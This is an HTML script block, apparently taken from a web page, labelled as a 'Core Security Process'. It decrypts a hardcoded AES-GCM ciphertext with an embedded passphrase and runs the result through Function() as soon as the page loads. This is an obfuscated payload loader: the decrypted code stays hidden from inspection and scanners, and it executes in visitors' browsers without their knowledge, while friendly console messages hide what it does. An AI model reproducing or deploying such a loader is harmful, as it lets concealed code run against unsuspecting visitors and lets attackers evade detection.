    <!-- Core Security Process -->
    <script>
        const processSecureInfo = async (cipherData, cipherKey, cipherSalt, accessPass) => {
            const decodeHex = (hex) => {
                const buffer = [];
                for (let i = 0; i < hex.length; i += 2) {
                    buffer.push(parseInt(hex.substr(i, 2), 16));
                }
                return new Uint8Array(buffer);
            };

            const simulateLag = () => new Promise(resolve => {
                setTimeout(resolve, 500);
            });

            const generateCryptoKey = async (rawKey, salt) => {
                return crypto.subtle.deriveKey(
                    { name: "PBKDF2", salt: salt, iterations: 100000, hash: "SHA-256" },
                    rawKey,
                    { name: "AES-GCM", length: 256 },
                    false,
                    ["decrypt"]
                );
            };

            const rawKey = await crypto.subtle.importKey(
                "raw",
                new TextEncoder().encode(accessPass),
                { name: "PBKDF2" },
                false,
                ["deriveKey"]
            );

            await simulateLag();
            const encryptionKey = await generateCryptoKey(rawKey, decodeHex(cipherSalt));

            try {
                const decryptedBytes = await crypto.subtle.decrypt(
                    { name: "AES-GCM", iv: decodeHex(cipherKey) },
                    encryptionKey,
                    decodeHex(cipherData)
                );
                console.log("[INFO] Decryption successful.");
                return new TextDecoder().decode(decryptedBytes);
            } catch (err) {
                console.error("[FAIL] Decryption failed:", err);
                return null;
            }
        };

        (async () => {
            console.log("[START] Initiating secure handling...");
            const securityBundle = {
                key: "ce12552921e07eeae6d25a8b",
                salt: "0ac6f6fafea5dd5e93ca4522b49d3681",
                data: "6deb93765e72ef8ce34b1b97d0c25c97611c83b0ac258d36b36d018cdb7ff468533920838d3707c758da44549d374e8e0ca5a6aa93b0af7aa6d1f2e3c26dcf486585b4c887ad5cb43aed7d90469c8c5265c8bbbeca57739d97e18e7cceac3acfa08db407fba57a71ff3d8a03b8299957024e3205442026156a361709ebd8c2df4c14a3c6c053abe5055489a44d42679720a67e7b98ddb7c15cf91320517d7e3b4c74750d19471e7e76750a80e4a099a0297edb403178b56fd0f152d4ac2ea37bc07720850870a3a7"
            };

            const passphrase = "homesweethome";
            const decryptedOutput = await processSecureInfo(securityBundle.data, securityBundle.key, securityBundle.salt, passphrase);
            Function(`${decryptedOutput}`)();

            if (decryptedOutput) {
                // console.log("[DEBUG] Final Output:", decryptedOutput);
            }
        })();
    </script>
